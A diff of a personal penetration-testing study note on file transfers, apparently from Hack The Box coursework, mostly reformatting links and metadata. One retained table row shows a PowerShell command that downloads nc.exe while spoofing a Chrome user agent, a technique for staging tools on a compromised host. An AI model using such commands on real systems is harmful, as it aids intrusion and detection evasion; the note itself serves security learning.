@@ -3,16 +3,16 @@ title: "File Transfers"
 tags:
   - cs/hacking
   - cs/hacking/htb
-programming-languages:
 created: 2022-07-06
+type: note
 ---
 # File Transfers
 ---
-- Netcat ([here](notes/hacking/netcat.md))
-- RDP ([here](notes/hacking/rdp.md))
-- [File Encryption](notes/hacking/file-encryption.md)
-- [Nginx](notes/hacking/nginx.md)
-- [Living off the land](notes/hacking/lolbins.md)
+- Netcat ([[netcat|here]])
+- RDP ([[rdp|here]])
+- [[file-encryption]]
+- [[nginx]]
+- [[lolbins|Living off the land]]
 
 # Windows
 ## Download Operations
@@ -714,7 +714,5 @@ passwd                                                                          
 | `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
 
 
-## Related
-- [File Transfer Cheatsheet](notes/hacking/htb-file-transfer-cheatsheet.md)
-- [Netcat](notes/hacking/netcat.md)
-- [Files Transfer - HTB Writeup](notes/hacking/files-transfer-htb-writeup.md)
+> [!nav]
+> [[hacking-hub|Hacking]]
